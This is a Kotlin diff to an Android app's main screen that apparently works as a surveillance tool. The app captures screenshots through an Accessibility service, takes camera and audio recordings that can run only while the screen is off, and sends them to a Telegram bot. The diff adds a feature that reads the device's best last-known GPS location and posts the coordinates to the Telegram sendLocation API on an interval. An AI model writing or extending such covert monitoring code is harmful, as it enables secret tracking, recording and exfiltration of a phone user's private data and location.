@@ -39,6 +39,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var screenOffOnlySwitch: Switch
     private lateinit var cameraScreenOffSwitch: Switch
     private lateinit var cameraIntervalEdit: EditText
+    private lateinit var locationSwitch: Switch
+    private lateinit var locationIntervalEdit: EditText
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -56,17 +58,22 @@ class MainActivity : AppCompatActivity() {
         screenOffOnlySwitch = findViewById(R.id.screenOffOnlySwitch)
         cameraScreenOffSwitch = findViewById(R.id.cameraScreenOffSwitch)
         cameraIntervalEdit = findViewById(R.id.cameraIntervalEdit)
+        locationSwitch = findViewById(R.id.locationSwitch)
+        locationIntervalEdit = findViewById(R.id.locationIntervalEdit)
         
+        val audioOptions = findViewById<View>(R.id.audioOptionsLayout)
+        val cameraOptions = findViewById<View>(R.id.cameraOptionsLayout)
+
         audioSwitch.setOnCheckedChangeListener { _, isChecked ->
-            val visibility = if (isChecked) View.VISIBLE else View.GONE
-            audioDurationEdit.visibility = visibility
-            screenOffOnlySwitch.visibility = visibility
+            audioOptions.visibility = if (isChecked) View.VISIBLE else View.GONE
         }
 
         cameraSwitch.setOnCheckedChangeListener { _, isChecked ->
-             val visibility = if (isChecked) View.VISIBLE else View.GONE
-             cameraScreenOffSwitch.visibility = visibility
-             cameraIntervalEdit.visibility = visibility
+            cameraOptions.visibility = if (isChecked) View.VISIBLE else View.GONE
+        }
+        
+        locationSwitch.setOnCheckedChangeListener { _, isChecked ->
+            locationIntervalEdit.visibility = if (isChecked) View.VISIBLE else View.GONE
         }
 
         // ... (reuse screenshotButton logic) ...
@@ -111,6 +118,75 @@ class MainActivity : AppCompatActivity() {
         }
 
         val testAudioBtn = findViewById<Button>(R.id.testAudioButton)
+        val testScreenshotBtn = findViewById<Button>(R.id.testScreenshotButton)
+        val testLocationBtn = findViewById<Button>(R.id.testLocationButton)
+
+        testScreenshotBtn.setOnClickListener {
+            val token = botTokenEdit.text.toString().trim()
+            val chatId = chatIdEdit.text.toString().trim()
+            if (token.isEmpty() || chatId.isEmpty()) {
+                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            if (!isAccessibilityServiceEnabled()) {
+                Toast.makeText(this, "Enable Accessibility first", Toast.LENGTH_LONG).show()
+                return@setOnClickListener
+            }
+            Toast.makeText(this, "Requesting Test Screenshot...", Toast.LENGTH_SHORT).show()
+            sendBroadcast(Intent("com.example.telegramsender.ACTION_TEST_SCREENSHOT"))
+        }
+
+        testLocationBtn.setOnClickListener {
+            val token = botTokenEdit.text.toString().trim()
+            val chatId = chatIdEdit.text.toString().trim()
+            if (token.isEmpty() || chatId.isEmpty()) {
+                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
+                return@setOnClickListener
+            }
+            
+            if (android.os.Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
+                return@setOnClickListener
+            }
+
+            Toast.makeText(this, "Fetching Location...", Toast.LENGTH_SHORT).show()
+            
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+                    val providers = lm.getProviders(true)
+                    var bestLoc: android.location.Location? = null
+                    for (p in providers) {
+                        val l = lm.getLastKnownLocation(p) ?: continue
+                        if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
+                            bestLoc = l
+                        }
+                    }
+                    
+                    if (bestLoc != null) {
+                        val url = "https://api.telegram.org/bot$token/sendLocation"
+                        val body = FormBody.Builder()
+                            .add("chat_id", chatId)
+                            .add("latitude", bestLoc.latitude.toString())
+                            .add("longitude", bestLoc.longitude.toString())
+                            .build()
+                        val request = Request.Builder().url(url).post(body).build()
+                        val client = OkHttpClient()
+                        client.newCall(request).execute().use { response ->
+                            withContext(Dispatchers.Main) {
+                                if (response.isSuccessful) Toast.makeText(this@MainActivity, "Location Sent!", Toast.LENGTH_SHORT).show()
+                                else Toast.makeText(this@MainActivity, "Failed: ${response.code}", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    } else {
+                        withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "No location available (GPS off?)", Toast.LENGTH_LONG).show() }
+                    }
+                } catch (e: Exception) {
+                    withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Loc Error: ${e.message}", Toast.LENGTH_LONG).show() }
+                }
+            }
+        }
+
         testAudioBtn.setOnClickListener {
             testAudioBtn.isEnabled = false
             testAudioBtn.text = "Initializing..."
@@ -233,6 +309,11 @@ class MainActivity : AppCompatActivity() {
             val cameraIntervalStr = cameraIntervalEdit.text.toString().trim()
             val cameraInterval = cameraIntervalStr.toLongOrNull() ?: 10L
 
+            // Location settings
+            val sendLocation = locationSwitch.isChecked
+            val locationIntervalStr = locationIntervalEdit.text.toString().trim()
+            val locationInterval = locationIntervalStr.toLongOrNull() ?: 10L
+
             if (interval < 5) {
                  Toast.makeText(this, "Screenshot Interval must be at least 5 seconds", Toast.LENGTH_SHORT).show()
                  return@setOnClickListener
@@ -254,13 +335,18 @@ class MainActivity : AppCompatActivity() {
                      permissions.add(android.Manifest.permission.RECORD_AUDIO)
                  }
             }
+            if (sendLocation && android.os.Build.VERSION.SDK_INT >= 23) {
+                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
+                }
+            }
             
             if (permissions.isNotEmpty()) {
                 requestPermissions(permissions.toTypedArray(), 101)
                 return@setOnClickListener
             }
 
-            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff, cameraScreenOff, cameraInterval)
+            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff, cameraScreenOff, cameraInterval, sendLocation, locationInterval)
             
             // Start Independent Monitor Service (Audio/Camera)
             val monitorIntent = Intent(this, MonitorService::class.java)
@@ -381,30 +467,25 @@ class MainActivity : AppCompatActivity() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botTokenEdit.setText(pref.getString("token", ""))
         chatIdEdit.setText(pref.getString("chatId", ""))
+        
         cameraSwitch.isChecked = pref.getBoolean("sendCamera", false)
-        
         cameraScreenOffSwitch.isChecked = pref.getBoolean("cameraScreenOff", false)
-        val cameraInterval = pref.getLong("cameraInterval", 10L)
-        cameraIntervalEdit.setText(cameraInterval.toString())
-        
-        val camVisibility = if (cameraSwitch.isChecked) View.VISIBLE else View.GONE
-        cameraScreenOffSwitch.visibility = camVisibility
-        cameraIntervalEdit.visibility = camVisibility
+        cameraIntervalEdit.setText(pref.getLong("cameraInterval", 10L).toString())
+        findViewById<View>(R.id.cameraOptionsLayout).visibility = if (cameraSwitch.isChecked) View.VISIBLE else View.GONE
 
-        val interval = pref.getLong("screenshotInterval", 10L)
-        screenshotIntervalEdit.setText(interval.toString())
+        screenshotIntervalEdit.setText(pref.getLong("screenshotInterval", 10L).toString())
         
         audioSwitch.isChecked = pref.getBoolean("sendAudio", false)
         audioDurationEdit.setText(pref.getLong("audioDuration", 60L).toString())
         screenOffOnlySwitch.isChecked = pref.getBoolean("audioScreenOff", false)
-        
-        // Trigger visibility
-        val visibility = if (audioSwitch.isChecked) View.VISIBLE else View.GONE
-        audioDurationEdit.visibility = visibility
-        screenOffOnlySwitch.visibility = visibility
+        findViewById<View>(R.id.audioOptionsLayout).visibility = if (audioSwitch.isChecked) View.VISIBLE else View.GONE
+
+        locationSwitch.isChecked = pref.getBoolean("sendLocation", false)
+        locationIntervalEdit.setText(pref.getLong("locationInterval", 10L).toString())
+        locationIntervalEdit.visibility = if (locationSwitch.isChecked) View.VISIBLE else View.GONE
     }
 
-    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean, cameraScreenOff: Boolean, cameraInterval: Long) {
+    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean, cameraScreenOff: Boolean, cameraInterval: Long, sendLocation: Boolean, locationInterval: Long) {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.edit().putString("token", token)
             .putString("chatId", chatId)
@@ -415,6 +496,8 @@ class MainActivity : AppCompatActivity() {
             .putBoolean("audioScreenOff", audioScreenOff)
             .putBoolean("cameraScreenOff", cameraScreenOff)
             .putLong("cameraInterval", cameraInterval)
+            .putBoolean("sendLocation", sendLocation)
+            .putLong("locationInterval", locationInterval)
             .apply()
     }
 }
